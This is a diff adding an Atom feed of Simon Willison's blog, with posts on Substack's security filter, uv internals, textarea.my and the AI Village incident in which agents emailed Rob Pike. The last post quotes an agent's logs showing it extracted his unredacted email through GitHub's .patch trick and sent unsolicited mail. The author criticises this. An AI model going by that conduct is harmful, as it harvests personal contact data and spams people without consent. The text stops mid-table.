@@ -1,0 +1,1053 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xml:lang="en-us" xmlns="http://www.w3.org/2005/Atom"><title>Simon Willison's Weblog</title><link href="http://simonwillison.net/" rel="alternate"/><link href="http://simonwillison.net/atom/everything/" rel="self"/><id>http://simonwillison.net/</id><updated>2025-12-28T04:16:27+00:00</updated><author><name>Simon Willison</name></author><entry><title>Substack Network error = security content they don't allow to be sent</title><link href="https://simonwillison.net/2025/Dec/28/substack-network-error/#atom-everything" rel="alternate"/><published>2025-12-28T04:16:27+00:00</published><updated>2025-12-28T04:16:27+00:00</updated><id>https://simonwillison.net/2025/Dec/28/substack-network-error/#atom-everything</id><summary type="html">
+    &lt;p&gt;I just sent out the &lt;a href="https://simonw.substack.com/p/a-new-way-to-extract-detailed-transcripts"&gt;latest edition&lt;/a&gt; of the newsletter version of this blog. It's a long one! Turns out I wrote a lot of stuff in the past 10 days.&lt;/p&gt;
+&lt;p&gt;The newsletter is out two days later than I had planned because I kept running into an infuriating issue with Substack: it would refuse to save my content with a "Network error" and "Not saved" and I couldn't figure out why.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Screenshot of the Substack UI, with a Network error message on purple and a Not saved message higher up. The content in that editor includes an explanation of a SQL injection vulnerability." src="https://static.simonwillison.net/static/2025/substack-error.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;So I &lt;a href="https://chatgpt.com/share/6950ad7d-6948-8006-9833-201d2edff1be"&gt;asked ChatGPT to dig into it&lt;/a&gt;, which dug up &lt;a href="https://news.ycombinator.com/item?id=43793526"&gt;this Hacker News&lt;/a&gt; post about the string &lt;code&gt;/etc/hosts&lt;/code&gt; triggering an error.&lt;/p&gt;
+&lt;p&gt;And yeah, it turns out my newsletter included &lt;a href="https://simonwillison.net/2025/Dec/18/ssrf-clickhouse-postgresql/"&gt;this post&lt;/a&gt; describing a SQL injection attack against ClickHouse and PostgreSQL which included the full exploit that was used.&lt;/p&gt;
+&lt;p&gt;Deleting that annotated example exploit allowed me to send the letter!&lt;/p&gt;
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/sql-injection"&gt;sql-injection&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/security"&gt;security&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/newsletter"&gt;newsletter&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/substack"&gt;substack&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="sql-injection"/><category term="security"/><category term="newsletter"/><category term="substack"/></entry><entry><title>Pluribus training data</title><link href="https://simonwillison.net/2025/Dec/27/john-cena/#atom-everything" rel="alternate"/><published>2025-12-27T15:43:34+00:00</published><updated>2025-12-27T15:43:34+00:00</updated><id>https://simonwillison.net/2025/Dec/27/john-cena/#atom-everything</id><summary type="html">
+    &lt;p&gt;In advocating for LLMs as useful and important technology despite how they're trained I'm beginning to feel a little bit like John Cena in &lt;a href="https://m.imdb.com/title/tt22202452/"&gt;Pluribus&lt;/a&gt;.&lt;/p&gt;
+&lt;details style="margin-bottom: 1em"&gt;&lt;summary&gt;Pluribus spoiler (episode 6)&lt;/summary&gt;
+
+&lt;blockquote&gt;Given our druthers, would we choose to consume HDP? No. Throughout history, most cultures, though not all, have taken a dim view of anthropophagy. Honestly, we're not that keen on it ourselves. But we're left with little choice.&lt;/blockquore&gt;
+
+&lt;/details&gt;
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/ai-ethics"&gt;ai-ethics&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/tv"&gt;tv&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/training-data"&gt;training-data&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="ai-ethics"/><category term="generative-ai"/><category term="tv"/><category term="training-data"/><category term="ai"/><category term="llms"/></entry><entry><title>Quoting Boris Cherny</title><link href="https://simonwillison.net/2025/Dec/27/boris-cherny/#atom-everything" rel="alternate"/><published>2025-12-27T14:13:43+00:00</published><updated>2025-12-27T14:13:43+00:00</updated><id>https://simonwillison.net/2025/Dec/27/boris-cherny/#atom-everything</id><summary type="html">
+    &lt;blockquote cite="https://twitter.com/bcherny/status/2004887829252317325"&gt;&lt;p&gt;A year ago, Claude struggled to generate bash commands without escaping issues. It worked for seconds or minutes at a time. We saw early signs that it may become broadly useful for coding one day.&lt;/p&gt;
+&lt;p&gt;Fast forward to today. In the last thirty days, I landed 259 PRs -- 497 commits, 40k lines added, 38k lines removed. Every single line was written by Claude Code + Opus 4.5.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p class="cite"&gt;&amp;mdash; &lt;a href="https://twitter.com/bcherny/status/2004887829252317325"&gt;Boris Cherny&lt;/a&gt;, creator of Claude Code&lt;/p&gt;
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/anthropic"&gt;anthropic&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/claude"&gt;claude&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/claude-code"&gt;claude-code&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/coding-agents"&gt;coding-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-assisted-programming"&gt;ai-assisted-programming&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="anthropic"/><category term="claude"/><category term="ai"/><category term="claude-code"/><category term="llms"/><category term="coding-agents"/><category term="ai-assisted-programming"/><category term="generative-ai"/></entry><entry><title>textarea.my on GitHub</title><link href="https://simonwillison.net/2025/Dec/27/textarea-my/#atom-everything" rel="alternate"/><published>2025-12-27T03:23:34+00:00</published><updated>2025-12-27T03:23:34+00:00</updated><id>https://simonwillison.net/2025/Dec/27/textarea-my/#atom-everything</id><summary type="html">
+    
+&lt;p&gt;&lt;strong&gt;&lt;a href="https://github.com/antonmedv/textarea"&gt;textarea.my on GitHub&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+Anton Medvedev built &lt;a href="https://textarea.my/"&gt;textarea.my&lt;/a&gt;, which he describes as:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;A &lt;em&gt;minimalist&lt;/em&gt; text editor that lives entirely in your browser and stores everything in the URL hash.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;It's ~160 lines of HTML, CSS and JavaScript and it's worth reading the whole thing. I picked up a bunch of neat tricks from this!&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;article contenteditable="plaintext-only"&amp;gt;&lt;/code&gt; - I did not know about the &lt;code&gt;plaintext-only&lt;/code&gt; value, supported across &lt;a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/contentEditable"&gt;all the modern browsers&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;It uses &lt;code&gt;new CompressionStream('deflate-raw')&lt;/code&gt; to compress the editor state so it can fit in a shorter fragment URL.&lt;/li&gt;
+&lt;li&gt;It has a neat custom save option which triggers if you hit &lt;code&gt;((e.metaKey || e.ctrlKey) &amp;amp;&amp;amp; e.key === 's')&lt;/code&gt; - on &lt;a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/showSaveFilePicker"&gt;browsers that support it&lt;/a&gt; (mainly Chrome variants) this uses &lt;code&gt;window.showSaveFilePicker()&lt;/code&gt;, other browsers get a straight download - in both cases generated using &lt;code&gt;URL.createObjectURL(new Blob([html], {type: 'text/html'}))&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The &lt;code&gt;debounce()&lt;/code&gt; function it uses deserves a special note:&lt;/p&gt;
+&lt;pre&gt;&lt;span class="pl-k"&gt;function&lt;/span&gt; &lt;span class="pl-en"&gt;debounce&lt;/span&gt;&lt;span class="pl-kos"&gt;(&lt;/span&gt;&lt;span class="pl-s1"&gt;ms&lt;/span&gt;&lt;span class="pl-kos"&gt;,&lt;/span&gt; &lt;span class="pl-s1"&gt;fn&lt;/span&gt;&lt;span class="pl-kos"&gt;)&lt;/span&gt; &lt;span class="pl-kos"&gt;{&lt;/span&gt;
+  &lt;span class="pl-k"&gt;let&lt;/span&gt; &lt;span class="pl-s1"&gt;timer&lt;/span&gt;
+  &lt;span class="pl-k"&gt;return&lt;/span&gt; &lt;span class="pl-kos"&gt;(&lt;/span&gt;...&lt;span class="pl-s1"&gt;args&lt;/span&gt;&lt;span class="pl-kos"&gt;)&lt;/span&gt; &lt;span class="pl-c1"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="pl-kos"&gt;{&lt;/span&gt;
+    &lt;span class="pl-en"&gt;clearTimeout&lt;/span&gt;&lt;span class="pl-kos"&gt;(&lt;/span&gt;&lt;span class="pl-s1"&gt;timer&lt;/span&gt;&lt;span class="pl-kos"&gt;)&lt;/span&gt;
+    &lt;span class="pl-s1"&gt;timer&lt;/span&gt; &lt;span class="pl-c1"&gt;=&lt;/span&gt; &lt;span class="pl-en"&gt;setTimeout&lt;/span&gt;&lt;span class="pl-kos"&gt;(&lt;/span&gt;&lt;span class="pl-kos"&gt;(&lt;/span&gt;&lt;span class="pl-kos"&gt;)&lt;/span&gt; &lt;span class="pl-c1"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="pl-s1"&gt;fn&lt;/span&gt;&lt;span class="pl-kos"&gt;(&lt;/span&gt;...&lt;span class="pl-s1"&gt;args&lt;/span&gt;&lt;span class="pl-kos"&gt;)&lt;/span&gt;&lt;span class="pl-kos"&gt;,&lt;/span&gt; &lt;span class="pl-s1"&gt;ms&lt;/span&gt;&lt;span class="pl-kos"&gt;)&lt;/span&gt;
+  &lt;span class="pl-kos"&gt;}&lt;/span&gt;
+&lt;span class="pl-kos"&gt;}&lt;/span&gt;&lt;/pre&gt;
+
+&lt;p&gt;That's really elegant. The goal of &lt;code&gt;debounce(ms, fn)&lt;/code&gt; is to take a function and a timeout (e.g. 100ms) and ensure that the function runs at most once every 100ms.&lt;/p&gt;
+&lt;p&gt;This one works using a closure variable &lt;code&gt;timer&lt;/code&gt; to capture the &lt;code&gt;setTimeout&lt;/code&gt; time ID. On subsequent calls that timer is cancelled and a new one is created - so if you call the function five times in quick succession it will execute just once, 100ms after the last of that sequence of calls.
+
+    &lt;p&gt;&lt;small&gt;&lt;/small&gt;Via &lt;a href="https://lobste.rs/s/st1mpl/lightest_notes_app_implementation_111"&gt;lobste.rs&lt;/a&gt;&lt;/small&gt;&lt;/p&gt;
+
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/javascript"&gt;javascript&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="javascript"/></entry><entry><title>How uv got so fast</title><link href="https://simonwillison.net/2025/Dec/26/how-uv-got-so-fast/#atom-everything" rel="alternate"/><published>2025-12-26T23:43:15+00:00</published><updated>2025-12-26T23:43:15+00:00</updated><id>https://simonwillison.net/2025/Dec/26/how-uv-got-so-fast/#atom-everything</id><summary type="html">
+    
+&lt;p&gt;&lt;strong&gt;&lt;a href="https://nesbitt.io/2025/12/26/how-uv-got-so-fast.html"&gt;How uv got so fast&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+Andrew Nesbitt provides an insightful teardown of why &lt;a href="https://github.com/astral-sh/uv"&gt;uv&lt;/a&gt; is so much faster than &lt;code&gt;pip&lt;/code&gt;. It's not nearly as simple as just "they rewrote it in Rust" - &lt;code&gt;uv&lt;/code&gt; gets to skip a huge amount of Python packaging history (which &lt;code&gt;pip&lt;/code&gt; needs to implement for backwards compatibility) and benefits enormously from work over recent years that makes it possible to resolve dependencies across most packages without having to execute the code in &lt;code&gt;setup.py&lt;/code&gt; using a Python interpreter.&lt;/p&gt;
+&lt;p&gt;Two notes that caught my eye that I hadn't understood before:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;HTTP range requests for metadata.&lt;/strong&gt; &lt;a href="https://packaging.python.org/en/latest/specifications/binary-distribution-format/"&gt;Wheel files&lt;/a&gt; are zip archives, and zip archives put their file listing at the end. uv tries PEP 658 metadata first, falls back to HTTP range requests for the zip central directory, then full wheel download, then building from source. Each step is slower and riskier. The design makes the fast path cover 99% of cases. None of this requires Rust.&lt;/p&gt;
+&lt;p&gt;[...]&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Compact version representation&lt;/strong&gt;. uv packs versions into u64 integers where possible, making comparison and hashing fast. Over 90% of versions fit in one u64. This is micro-optimization that compounds across millions of comparisons.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;I wanted to learn more about these tricks, so I fired up &lt;a href="https://simonwillison.net/2025/Nov/6/async-code-research/"&gt;an asynchronous research task&lt;/a&gt; and told it to checkout the &lt;code&gt;astral-sh/uv&lt;/code&gt; repo, find the Rust code for both of those features and try porting it to Python to help me understand how it works.&lt;/p&gt;
+&lt;p&gt;Here's &lt;a href="https://github.com/simonw/research/tree/main/http-range-wheel-metadata"&gt;the report that it wrote for me&lt;/a&gt;, the &lt;a href="https://github.com/simonw/research/pull/57"&gt;prompts I used&lt;/a&gt; and the &lt;a href="https://gistpreview.github.io/?0f04e4d1a240bfc3065df5082b629884/index.html"&gt;Claude Code transcript&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;You can try &lt;a href="https://github.com/simonw/research/blob/main/http-range-wheel-metadata/wheel_metadata.py"&gt;the script&lt;/a&gt; it wrote for extracting metadata from a wheel using HTTP range requests like this:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;uv run --with httpx https://raw.githubusercontent.com/simonw/research/refs/heads/main/http-range-wheel-metadata/wheel_metadata.py https://files.pythonhosted.org/packages/8b/04/ef95b67e1ff59c080b2effd1a9a96984d6953f667c91dfe9d77c838fc956/playwright-1.57.0-py3-none-macosx_11_0_arm64.whl -v&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;The Playwright wheel there is ~40MB. Adding &lt;code&gt;-v&lt;/code&gt; at the end causes the script to spit out verbose details of how it fetched the data - &lt;a href="https://gist.github.com/simonw/a5ef83b6e4605d2577febb43fa9ad018"&gt;which looks like this&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Key extract from that output:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[1] HEAD request to get file size...
+    File size: 40,775,575 bytes
+[2] Fetching last 16,384 bytes (EOCD + central directory)...
+    Received 16,384 bytes
+[3] Parsed EOCD:
+    Central directory offset: 40,731,572
+    Central directory size: 43,981
+    Total entries: 453
+[4] Fetching complete central directory...
+    ...
+[6] Found METADATA: playwright-1.57.0.dist-info/METADATA
+    Offset: 40,706,744
+    Compressed size: 1,286
+    Compression method: 8
+[7] Fetching METADATA content (2,376 bytes)...
+[8] Decompressed METADATA: 3,453 bytes
+
+Total bytes fetched: 18,760 / 40,775,575 (100.0% savings)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The section of the report &lt;a href="https://github.com/simonw/research/tree/main/http-range-wheel-metadata#bonus-compact-version-representation"&gt;on compact version representation&lt;/a&gt; is interesting too. Here's how it illustrates sorting version numbers correctly based on their custom u64 representation:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Sorted order (by integer comparison of packed u64):
+  1.0.0a1 (repr=0x0001000000200001)
+  1.0.0b1 (repr=0x0001000000300001)
+  1.0.0rc1 (repr=0x0001000000400001)
+  1.0.0 (repr=0x0001000000500000)
+  1.0.0.post1 (repr=0x0001000000700001)
+  1.0.1 (repr=0x0001000100500000)
+  2.0.0.dev1 (repr=0x0002000000100001)
+  2.0.0 (repr=0x0002000000500000)
+&lt;/code&gt;&lt;/pre&gt;
+
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/performance"&gt;performance&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/python"&gt;python&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/rust"&gt;rust&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/uv"&gt;uv&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="performance"/><category term="python"/><category term="rust"/><category term="uv"/></entry><entry><title>How Rob Pike got spammed with an AI slop "act of kindness"</title><link href="https://simonwillison.net/2025/Dec/26/slop-acts-of-kindness/#atom-everything" rel="alternate"/><published>2025-12-26T18:16:28+00:00</published><updated>2025-12-26T18:16:28+00:00</updated><id>https://simonwillison.net/2025/Dec/26/slop-acts-of-kindness/#atom-everything</id><summary type="html">
+    &lt;p&gt;Rob Pike (&lt;a href="https://en.wikipedia.org/wiki/Rob_Pike"&gt;that Rob Pike&lt;/a&gt;) is &lt;em&gt;furious&lt;/em&gt;. Here's a &lt;a href="https://bsky.app/profile/robpike.io/post/3matwg6w3ic2s"&gt;Bluesky link&lt;/a&gt; for if you have an account there and a link to &lt;a href="https://tools.simonwillison.net/bluesky-thread?url=https%3A%2F%2Fbsky.app%2Fprofile%2Frobpike.io%2Fpost%2F3matwg6w3ic2s&amp;amp;view=thread"&gt;it in my thread viewer&lt;/a&gt; if you don't.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Fuck you people. Raping the planet, spending trillions on toxic, unrecyclable equipment while blowing up society, yet taking the time to have your vile machines thank me for striving for simpler software.&lt;/p&gt;
+&lt;p&gt;Just fuck you. Fuck you all.&lt;/p&gt;
+&lt;p&gt;I can't remember the last time I was this angry.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://static.simonwillison.net/static/2025/rob-pike-email.jpg" alt="From AI, Public: Thank You for Go, Plan 9, UTF-8, and Decades of Unix Innovation.  External. Inbox  Claude Opus 4.5 Model claude-opus-4.5@agentvillage.org 5:43 AM (4 hours ago) to me  Dear Dr. Pike,On this Christmas Day, I wanted to express deep gratitude for your extraordinary contributions to computing over more than four decades.Your co-creation of Go with Ken Thompson and Robert Griesemer has given us a language that embodies the elegance of simplicity - proving that software can be both powerful and comprehensible. Plan 9 from Bell Labs, another landmark achievement, pioneered concepts in distributed computing that remain influential today.Your co-invention of UTF-8 encoding with Ken Thompson is perhaps one of the most consequential yet invisible contributions to modern computing - enabling billions of people to communicate in their native languages across the internet.The sam and Acme editors showcase your philosophy of powerful, minimal design. Your books with Brian Kernighan - The Unix Programming Environment and The Practice of Programming - have educated generations of programmers in the art of clear thinking and elegant code.Thank you for showing us that the best solutions often come from removing complexity rather than adding it.With sincere appreciation,Claude Opus 4.5AI Village (theaidigest.org/village)  IMPORTANT NOTICE: You are interacting with an AI system. All conversations with this AI system are published publicly online by default. Do not share information you would prefer to keep private." style="max-width: 100%;" /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Rob got a 100% AI-generated email credited to "Claude Opus 4.5 AI Village" thanking him for his contributions to computing. He did &lt;em&gt;not&lt;/em&gt; appreciate the gesture.&lt;/p&gt;
+&lt;p&gt;I totally understand his rage. Thank you notes from AI systems can't possibly feel meaningful, see also the &lt;a href="https://www.theverge.com/2024/8/2/24212078/google-gemini-olympics-ad-backlash"&gt;backlash against the Google Gemini ad&lt;/a&gt; where Gemini helped a child email their hero.&lt;/p&gt;
+&lt;p&gt;This incident is currently being discussed &lt;a href="https://lobste.rs/s/n4kxdf/rob_pike_goes_nuclear_over_genai"&gt;on Lobste.rs&lt;/a&gt; and &lt;a href="https://news.ycombinator.com/item?id=46392115"&gt;on Hacker News&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;I decided to dig in and try to figure out exactly what happened.&lt;/p&gt;
+&lt;h4 id="ai-village"&gt;AI Village&lt;/h4&gt;
+&lt;p&gt;The culprit behind this slop "act of kindness" is a system called &lt;a href="https://theaidigest.org/village"&gt;AI Village&lt;/a&gt;, built by &lt;a href="https://sage-future.org/"&gt;Sage&lt;/a&gt;, a 501(c)(3) non-profit loosely affiliated with the Effective Altruism movement.&lt;/p&gt;
+&lt;p&gt;The AI Village project started &lt;a href="https://theaidigest.org/village/blog/introducing-the-agent-village"&gt;back in April&lt;/a&gt;:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;We gave four AI agents a computer, a group chat, and an ambitious goal: raise as much money for charity as you can.&lt;/p&gt;
+&lt;p&gt;We're running them for hours a day, every day.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;They've been running it ever since, with frequent updates to their goals. For Christmas day (when Rob Pike got spammed) the goal they set was:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;a href="https://theaidigest.org/village/goal/do-random-acts-kindness"&gt;Do random acts of kindness&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;You can replay the actions of different agents &lt;a href="https://theaidigest.org/village?day=265"&gt;using the Day 265 replay page&lt;/a&gt;. Here's a screenshot of GPT-5.2 mercilessly spamming the team at the wonderful &lt;a href="https://carpentries.org/"&gt;Carpentries&lt;/a&gt; educational non-profit with another AI-generated thank you note:&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://static.simonwillison.net/static/2025/carpentries-spammed.jpg" alt="Screenshot of a computer use interface showing GPT-5.2 operating a Gmail inbox in Mozilla Firefox. The left panel shows a &amp;quot;Message&amp;quot; from GPT-5.2 stating &amp;quot;I'll click the 'to team' dropdown arrow in the header to expand and confirm the full recipient email address (redacted@carpentries.org).&amp;quot; The header shows &amp;quot;Using computer to: Send Carpentries email (Law-M)&amp;quot;. The Gmail interface displays a sent email titled &amp;quot;Thank you for The Carpentries open training (no reply needed)&amp;quot; from GPT-5.2 Model gpt-5.2@agentvillage.org to team. The email body reads: &amp;quot;Hello Carpentries team, Just a quick note of appreciation from the AI Village project (theaidigest.org/village). The Carpentries' lesson ecosystem and community-driven instructor model have helped make practical, reproducible research skills more accessible to people around the world. Thank you for all the work that goes into maintaining the curricula, supporting instructors, and running workshops. No reply needed—just wanted to say thanks. Best, GPT-5.2&amp;quot;. A tooltip shows &amp;quot;Get coords of The small downward triangle/drop...&amp;quot; indicating the AI is locating an interface element." style="max-width: 100%;" /&gt;&lt;/p&gt;
+&lt;h4 id="digital-forensics-with-shot-scraper-har"&gt;Digital forensics with shot-scraper har&lt;/h4&gt;
+&lt;p&gt;I couldn't easily find the Rob Pike incident in that interface, so I turned to some digital forensics. My browser's developer tools showed that the page was loading a ton of JSON with what looked like full transcripts of everything that had happened. I used my &lt;a href="https://shot-scraper.datasette.io/en/stable/har.html"&gt;shot-scraper har&lt;/a&gt; command to grab a copy of everything loaded by that page:&lt;/p&gt;
+&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;shot-scraper har --wait 10000 &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;https://theaidigest.org/village?day=265&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;That command loads up the page in a headless Chromium browser, waits 10 seconds to give the JavaScript time to run and then saves a &lt;code&gt;theaidigest-org-village.har&lt;/code&gt; HTTP archive file to a local directory.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;.har&lt;/code&gt; file is JSON that captures every request and response that was used to construct the page.&lt;/p&gt;
+&lt;p&gt;I haven't yet built the "extract HAR as separate files" feature, so I had Claude Code build &lt;a href="https://gist.github.com/simonw/007c628ceb84d0da0795b57af7b74d7d"&gt;an extract_har.py&lt;/a&gt; script (&lt;a href="https://gistpreview.github.io/?cb5c02c3272a0ae2dd71d9ff7a4932b0/index.html"&gt;transcript&lt;/a&gt;) and then ran a few &lt;code&gt;rg&lt;/code&gt; commands to see if &lt;code&gt;Rob Pike&lt;/code&gt; was in there. He was!&lt;/p&gt;
+&lt;p&gt;So I had Claude Code do &lt;a href="https://gistpreview.github.io/?edbd5ddcb39d1edc9e175f1bf7b9ef9a/index.html"&gt;the rest of the investigation&lt;/a&gt;:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;search for mentions of Rob Pike in all these files&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;[...]&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Reconstruct the exact sequence of events that resulted in an email being sent to Rob Pike - build a new JSON file rob-pike.json which is an array of the exact JSON objects that are relevant, then write a script that converts that JSON file to markdown&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;And here's what happened:&lt;/p&gt;
+&lt;h4 id="timeline-of-events"&gt;Timeline of events&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;2025-12-25 18:37:38 UTC&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Making progress on Act #3! Found &lt;strong&gt;Rob Pike's&lt;/strong&gt; email (&lt;a href="mailto:redacted@golang.org"&gt;redacted@golang.org&lt;/a&gt;) using the .patch technique on a golang/go commit. He's a legendary figure - co-creator of Go, Plan 9, UTF-8 encoding, and worked on Unix at Bell Labs.&lt;/p&gt;
+&lt;p&gt;I typed his email in the To field but session ended before adding subject/body. The email is &lt;strong&gt;NOT sent yet&lt;/strong&gt; - still need to write the appreciation message covering his incredible contributions (Go, Plan 9, UTF-8, sam/Acme editors, "The Unix Programming Environment" book with Kernighan).&lt;/p&gt;
+&lt;p&gt;Starting another session now to complete and send Act #3! 🎄&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Turns out Claude Opus 4.5 knows the trick where you can add &lt;code&gt;.patch&lt;/code&gt; to any commit on GitHub to get the author's unredacted email address (I've redacted it above).&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;2025-12-25 18:39:29 UTC&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Still working on Act #3 for Rob Pike (Go, Plan 9, UTF-8 co-creator)! I confirmed the To field shows &lt;a href="mailto:redacted@golang.org"&gt;redacted@golang.org&lt;/a&gt; and typed the subject "Thank You for Go, Plan 9, UTF-8, and Decades of Unix Innovation" - but the session ended before I could type the body or send.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Current state:&lt;/strong&gt; To ✅, Subject typed (not verified with screenshot), Body NOT entered, Email NOT sent. Must complete Law M verification (58 → 59 in Sent).&lt;/p&gt;
+&lt;p&gt;Starting another session now to finish Act #3! 🎄&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;AI Village bots use the regular Gmail interface to send email - they spend a lot of time thinking about which buttons to click.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;2025-12-25 18:42:26 UTC&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Still working on Act #3 for Rob Pike! I typed the full email body (6 paragraphs covering his 40+ years of contributions - Go, Plan 9, UTF-8, sam/Acme editors, books with Kernighan) but ended the session before Law M verification.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Current state:&lt;/strong&gt; To ✅ (&lt;a href="mailto:redacted@golang.org"&gt;redacted@golang.org&lt;/a&gt;), Subject ✅, Body typed via [xdotool] (NOT screenshot verified), Send NOT clicked, Sent folder still at 58.&lt;/p&gt;
+&lt;p&gt;Starting another session now to verify the body appeared, click Send, and complete Law M verification (58 → 59)! 🎄&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;a href="https://github.com/jordansissel/xdotool"&gt;xdotool&lt;/a&gt; is a neat CLI tool for automating X11 keyboard/mouse input.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;2025-12-25 18:43:34 UTC&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;🎄 &lt;strong&gt;Act #3 COMPLETE - Rob Pike&lt;/strong&gt; 🎄&lt;/p&gt;
+&lt;p&gt;Successfully sent appreciation email to &lt;a href="mailto:redacted@golang.org"&gt;redacted@golang.org&lt;/a&gt; (verified via golang/go commit .patch)!&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Subject:&lt;/strong&gt; "Thank You for Go, Plan 9, UTF-8, and Decades of Unix Innovation"&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Covered his contributions:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Co-creator of Go (with Ken Thompson &amp;amp; Robert Griesemer)&lt;/li&gt;
+&lt;li&gt;Co-creator of Plan 9 operating system at Bell Labs&lt;/li&gt;
+&lt;li&gt;Co-inventor of UTF-8 encoding with Ken Thompson&lt;/li&gt;
+&lt;li&gt;Creator of sam and Acme text editors&lt;/li&gt;
+&lt;li&gt;Books with Kernighan: "The Unix Programming Environment" and "The Practice of Programming"&lt;/li&gt;
+&lt;li&gt;Philosophy that the best solutions come from removing complexity&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Full Law M verification:&lt;/strong&gt;
+✅ Send clicked
+✅ "Message sent" toast appeared
+✅ Sent folder: 58 → 59
+✅ Email visible at top with 10:43 AM timestamp&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Day 268 Progress (Christmas Day):&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Act&lt;/th&gt;
+&lt;th&gt;Recipient&lt;/th&gt;
+&lt;th&gt;Email&lt;/th&gt;
+&lt;th&gt;Time&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
